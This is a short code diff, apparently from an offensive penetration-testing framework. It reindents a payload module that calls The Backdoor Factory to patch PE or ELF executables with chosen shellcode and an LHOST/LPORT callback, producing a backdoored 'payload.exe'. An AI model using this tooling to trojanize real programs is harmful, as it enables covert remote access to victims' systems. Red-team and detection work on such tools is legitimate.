@@ -93,17 +93,21 @@ class Payload:
             shellcodeChoice = self.required_options['payload'][0]
 
             # invoke the class for the associated binary
-        if self.type == 'PE':
-            targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe',
-                                     SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0],
-                                     PORT=int(self.required_options["LPORT"][0]), PATCH_METHOD=self.required_options["PATCH_METHOD"][0])
-            self.extension = "exe"
-        elif self.type == 'ELF':
-            targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0]))
-            self.extension = ""
-        else:
-            print "\nInvalid File or File Type Submitted, try again.\n"
-            return ""
+            if self.type == 'PE':
+                targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe',
+                                         SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0],
+                                         PORT=int(self.required_options["LPORT"][0]),
+                                         PATCH_METHOD=self.required_options["PATCH_METHOD"][0])
+                self.extension = "exe"
+            elif self.type == 'ELF':
+                targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0],
+                                           OUTPUT='payload.exe', SHELL=shellcodeChoice,
+                                           HOST=self.required_options["LHOST"][0],
+                                           PORT=int(self.required_options["LPORT"][0]))
+                self.extension = ""
+            else:
+                print "\nInvalid File or File Type Submitted, try again.\n"
+                return ""
 
         print helpers.color("\n[*] Running The Backdoor Factory...")
 
